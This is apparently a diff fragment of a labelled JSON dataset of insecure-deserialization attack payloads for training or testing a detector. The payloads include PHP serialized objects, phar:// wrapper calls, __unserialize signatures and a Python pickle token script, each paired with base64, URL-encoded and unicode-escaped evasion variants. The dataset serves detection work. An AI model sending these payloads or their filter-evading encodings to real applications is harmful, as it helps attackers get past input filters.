+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c25b787a9b9505059ef08f80a18faded6ff5e344fc1208cb5f19829b6380cf74",
+    "original_id": "raw_deser_00014",
+    "original_payload": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+    "obfuscated_payload": "TzoxMzoiT2JqZWN0RXhhbXBsZSI6Mjp7czoxMDoic2VjcmV0Q29kZSI7TjtzOjU6Imd1ZXNzIjtSOjI7fQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 49065611,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00015__obf01",
+    "payload": "Wrapper%2520Phar%253A%252F%252F",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "732e3cc89de8c129001ee1966318c6f67679cfeae531374c9ffb861e327db11b",
+    "original_id": "raw_deser_00015",
+    "original_payload": "Wrapper Phar://",
+    "obfuscated_payload": "Wrapper%2520Phar%253A%252F%252F",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 49162587,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00015__obf02",
+    "payload": "V3JhcHBlciBQaGFyOi8v",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "732e3cc89de8c129001ee1966318c6f67679cfeae531374c9ffb861e327db11b",
+    "original_id": "raw_deser_00015",
+    "original_payload": "Wrapper Phar://",
+    "obfuscated_payload": "V3JhcHBlciBQaGFyOi8v",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 49163596,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00015__obf03",
+    "payload": "Wrapper%0APhar\\u003a//",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "732e3cc89de8c129001ee1966318c6f67679cfeae531374c9ffb861e327db11b",
+    "original_id": "raw_deser_00015",
+    "original_payload": "Wrapper Phar://",
+    "obfuscated_payload": "Wrapper%0APhar\\u003a//",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49164605,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00015__obf04",
+    "payload": "Wrapper%2520Phar%255Cu003a%255Cu002f%252F",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "732e3cc89de8c129001ee1966318c6f67679cfeae531374c9ffb861e327db11b",
+    "original_id": "raw_deser_00015",
+    "original_payload": "Wrapper Phar://",
+    "obfuscated_payload": "Wrapper%2520Phar%255Cu003a%255Cu002f%252F",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode_twice"
+    ],
+    "generation_seed": 49165614,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00016__obf01",
+    "payload": "__unserialize%28)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aee324a51136b80b364053dfa6635cec41380d7c495720ac539d5bd3af7c4ca4",
+    "original_id": "raw_deser_00016",
+    "original_payload": "__unserialize()",
+    "obfuscated_payload": "__unserialize%28)",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49262590,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00016__obf02",
+    "payload": "X191bnNlcmlhbGl6ZSgp",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aee324a51136b80b364053dfa6635cec41380d7c495720ac539d5bd3af7c4ca4",
+    "original_id": "raw_deser_00016",
+    "original_payload": "__unserialize()",
+    "obfuscated_payload": "X191bnNlcmlhbGl6ZSgp",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 49263599,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00016__obf03",
+    "payload": "__unserialize\\u0028)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aee324a51136b80b364053dfa6635cec41380d7c495720ac539d5bd3af7c4ca4",
+    "original_id": "raw_deser_00016",
+    "original_payload": "__unserialize()",
+    "obfuscated_payload": "__unserialize\\u0028)",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49264608,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00016__obf04",
+    "payload": "X191bnNlcmlhbGl6ZVx1MDAyOCk",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aee324a51136b80b364053dfa6635cec41380d7c495720ac539d5bd3af7c4ca4",
+    "original_id": "raw_deser_00016",
+    "original_payload": "__unserialize()",
+    "obfuscated_payload": "X191bnNlcmlhbGl6ZVx1MDAyOCk",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 49265617,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00017__obf01",
+    "payload": "__unserialize%28array%20%24data%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18f073982c47aa0212a7c01ade7b4a2d975fad65232ed7ad1499cd1aa65a182c",
+    "original_id": "raw_deser_00017",
+    "original_payload": "__unserialize(array $data)",
+    "obfuscated_payload": "__unserialize%28array%20%24data%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49362593,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00017__obf02",
+    "payload": "X191bnNlcmlhbGl6ZShhcnJheSAkZGF0YSk",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18f073982c47aa0212a7c01ade7b4a2d975fad65232ed7ad1499cd1aa65a182c",
+    "original_id": "raw_deser_00017",
+    "original_payload": "__unserialize(array $data)",
+    "obfuscated_payload": "X191bnNlcmlhbGl6ZShhcnJheSAkZGF0YSk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 49363602,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00017__obf03",
+    "payload": "__unserialize(array+$data)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18f073982c47aa0212a7c01ade7b4a2d975fad65232ed7ad1499cd1aa65a182c",
+    "original_id": "raw_deser_00017",
+    "original_payload": "__unserialize(array $data)",
+    "obfuscated_payload": "__unserialize(array+$data)",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 49364611,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00017__obf04",
+    "payload": "__unserialize(array%5Cu0020%24data%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18f073982c47aa0212a7c01ade7b4a2d975fad65232ed7ad1499cd1aa65a182c",
+    "original_id": "raw_deser_00017",
+    "original_payload": "__unserialize(array $data)",
+    "obfuscated_payload": "__unserialize(array%5Cu0020%24data%29",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode"
+    ],
+    "generation_seed": 49365620,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00018__obf01",
+    "payload": "phar%3A%2F%2F",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5adcd215a9bd1883d95221d03bff1cf2a2eaa0addf3291c83bba3a2c6950f671",
+    "original_id": "raw_deser_00018",
+    "original_payload": "phar://",
+    "obfuscated_payload": "phar%3A%2F%2F",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49462596,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00018__obf02",
+    "payload": "cGhhcjovLw==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5adcd215a9bd1883d95221d03bff1cf2a2eaa0addf3291c83bba3a2c6950f671",
+    "original_id": "raw_deser_00018",
+    "original_payload": "phar://",
+    "obfuscated_payload": "cGhhcjovLw==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 49463605,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00018__obf03",
+    "payload": "phar\\u003a\\u002f\\u002f",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5adcd215a9bd1883d95221d03bff1cf2a2eaa0addf3291c83bba3a2c6950f671",
+    "original_id": "raw_deser_00018",
+    "original_payload": "phar://",
+    "obfuscated_payload": "phar\\u003a\\u002f\\u002f",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49464614,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00018__obf04",
+    "payload": "cGhhclx1MDAzYS9cdTAwMmY=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5adcd215a9bd1883d95221d03bff1cf2a2eaa0addf3291c83bba3a2c6950f671",
+    "original_id": "raw_deser_00018",
+    "original_payload": "phar://",
+    "obfuscated_payload": "cGhhclx1MDAzYS9cdTAwMmY=",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode"
+    ],
+    "generation_seed": 49465623,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00019__obf01",
+    "payload": "file_get_contents%28%22phar%3A%2F/.%2Farchives%2Fapp.phar\")",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ae884f0ff0577442f8f744adfdac9ee101c2580358e0690edb347c69b76f9645",
+    "original_id": "raw_deser_00019",
+    "original_payload": "file_get_contents(\"phar://./archives/app.phar\")",
+    "obfuscated_payload": "file_get_contents%28%22phar%3A%2F/.%2Farchives%2Fapp.phar\")",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49562599,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00019__obf02",
+    "payload": "ZmlsZV9nZXRfY29udGVudHMoInBoYXI6Ly8uL2FyY2hpdmVzL2FwcC5waGFyIik=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ae884f0ff0577442f8f744adfdac9ee101c2580358e0690edb347c69b76f9645",
+    "original_id": "raw_deser_00019",
+    "original_payload": "file_get_contents(\"phar://./archives/app.phar\")",
+    "obfuscated_payload": "ZmlsZV9nZXRfY29udGVudHMoInBoYXI6Ly8uL2FyY2hpdmVzL2FwcC5waGFyIik=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 49563608,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00019__obf03",
+    "payload": "file_get_contents(\\u0022phar:\\u002f/.\\u002farchives/app.phar\\u0022)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ae884f0ff0577442f8f744adfdac9ee101c2580358e0690edb347c69b76f9645",
+    "original_id": "raw_deser_00019",
+    "original_payload": "file_get_contents(\"phar://./archives/app.phar\")",
+    "obfuscated_payload": "file_get_contents(\\u0022phar:\\u002f/.\\u002farchives/app.phar\\u0022)",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49564617,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00019__obf04",
+    "payload": "%66i%6Ce_g%65%74_co%6Etents(\"phar://./%61r%63h%69ves/app.phar\")",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ae884f0ff0577442f8f744adfdac9ee101c2580358e0690edb347c69b76f9645",
+    "original_id": "raw_deser_00019",
+    "original_payload": "file_get_contents(\"phar://./archives/app.phar\")",
+    "obfuscated_payload": "%66i%6Ce_g%65%74_co%6Etents(\"phar://./%61r%63h%69ves/app.phar\")",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49565626,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00020__obf01",
+    "payload": "import%20cPickle%0Afrom%20base64%20import%20b64encode%2C%20b64decode%0A%0Aclass%20User%3A%0A%20%20%20%20def%20__init__%28self%29%3A%0A%20%20%20%20%20%20%20%20self.username%20%3D%20%22anonymous%22%0A%20%20%20%20%20%20%20%20self.password%20%3D%20%22anonymous%22%0A%20%20%20%20%20%20%20%20self.rank%20%20%20%20%20%3D%20%22guest%22%0A%0Ah%20%3D%20User%28%29%0Aauth_token%20%3D%20b64encode%28cPickle.dumps%28h%29%29%0Aprint%28%22Your%20Auth%20Token%20%3A%20%7B%7D%22%29.format%28auth_token%29",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2d2be12229ab3a30547103ce24823221910c74ead3f65a085b0e0e572b31fc52",
+    "original_id": "raw_deser_00020",
+    "original_payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)",
+    "obfuscated_payload": "import%20cPickle%0Afrom%20base64%20import%20b64encode%2C%20b64decode%0A%0Aclass%20User%3A%0A%20%20%20%20def%20__init__%28self%29%3A%0A%20%20%20%20%20%20%20%20self.username%20%3D%20%22anonymous%22%0A%20%20%20%20%20%20%20%20self.password%20%3D%20%22anonymous%22%0A%20%20%20%20%20%20%20%20self.rank%20%20%20%20%20%3D%20%22guest%22%0A%0Ah%20%3D%20User%28%29%0Aauth_token%20%3D%20b64encode%28cPickle.dumps%28h%29%29%0Aprint%28%22Your%20Auth%20Token%20%3A%20%7B%7D%22%29.format%28auth_token%29",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49662602,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00020__obf02",
+    "payload": "aW1wb3J0IGNQaWNrbGUKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGVuY29kZSwgYjY0ZGVjb2RlCgpjbGFzcyBVc2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYudXNlcm5hbWUgPSAiYW5vbnltb3VzIgogICAgICAgIHNlbGYucGFzc3dvcmQgPSAiYW5vbnltb3VzIgogICAgICAgIHNlbGYucmFuayAgICAgPSAiZ3Vlc3QiCgpoID0gVXNlcigpCmF1dGhfdG9rZW4gPSBiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhoKSkKcHJpbnQoIllvdXIgQXV0aCBUb2tlbiA6IHt9IikuZm9ybWF0KGF1dGhfdG9rZW4p",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2d2be12229ab3a30547103ce24823221910c74ead3f65a085b0e0e572b31fc52",
+    "original_id": "raw_deser_00020",
+    "original_payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)",
+    "obfuscated_payload": "aW1wb3J0IGNQaWNrbGUKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGVuY29kZSwgYjY0ZGVjb2RlCgpjbGFzcyBVc2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYudXNlcm5hbWUgPSAiYW5vbnltb3VzIgogICAgICAgIHNlbGYucGFzc3dvcmQgPSAiYW5vbnltb3VzIgogICAgICAgIHNlbGYucmFuayAgICAgPSAiZ3Vlc3QiCgpoID0gVXNlcigpCmF1dGhfdG9rZW4gPSBiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhoKSkKcHJpbnQoIllvdXIgQXV0aCBUb2tlbiA6IHt9IikuZm9ybWF0KGF1dGhfdG9rZW4p",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 49663611,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00020__obf03",
+    "payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self\\u0029:\n        self.username \\u003d \\u0022anonymous\\u0022\n        self.password \\u003d \"anonymous\\u0022\n        self.rank     = \\u0022guest\\u0022\n\nh \\u003d User()\nauth_token \\u003d b64encode(cPickle.dumps(h\\u0029)\nprint(\\u0022Your Auth Token : \\u007b\\u007d\"\\u0029.format\\u0028auth_token)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2d2be12229ab3a30547103ce24823221910c74ead3f65a085b0e0e572b31fc52",
+    "original_id": "raw_deser_00020",
+    "original_payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)",
+    "obfuscated_payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self\\u0029:\n        self.username \\u003d \\u0022anonymous\\u0022\n        self.password \\u003d \"anonymous\\u0022\n        self.rank     = \\u0022guest\\u0022\n\nh \\u003d User()\nauth_token \\u003d b64encode(cPickle.dumps(h\\u0029)\nprint(\\u0022Your Auth Token : \\u007b\\u007d\"\\u0029.format\\u0028auth_token)",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49664620,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00020__obf04",
